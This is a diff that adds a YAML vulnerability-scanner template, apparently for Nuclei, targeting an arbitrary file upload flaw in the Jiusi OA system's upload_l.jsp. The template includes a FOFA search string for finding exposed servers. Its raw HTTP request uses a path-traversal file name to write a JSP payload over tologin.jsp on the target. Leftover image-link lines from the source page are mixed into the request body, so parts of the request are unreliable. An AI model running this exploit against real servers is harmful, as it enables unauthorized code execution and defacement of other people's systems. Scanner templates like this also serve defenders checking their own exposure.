@@ -1,0 +1,46 @@
+id: poc-bs61ine4pxecp3v6
+info:
+  name: 九思OA系统upload_l.jsp存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bs61ine4pxecp3v6'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bs61ine4pxecp3v6
+    fofa: body="/jsoa/webmail/ajax_util.js"
+http:
+- raw:
+  - 'POST /jsoa/wpsforlinux/src/upload_l.jsp?openType=1&flowflag=1&userName=1&recordId=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
+
+    Content-Length: 102
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Connection: close
+
+    Upgrade-Insecure-Requests: 1
+
+    filename: /../../tologin.jsp
+
+
+    <%out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1734433008627-fa283881-11aa-4a97-a6cb-e41cff2ece42.png)
+
+    文件路径
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1734433008901-728c4700-88fd-4359-b938-f747760485cd.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
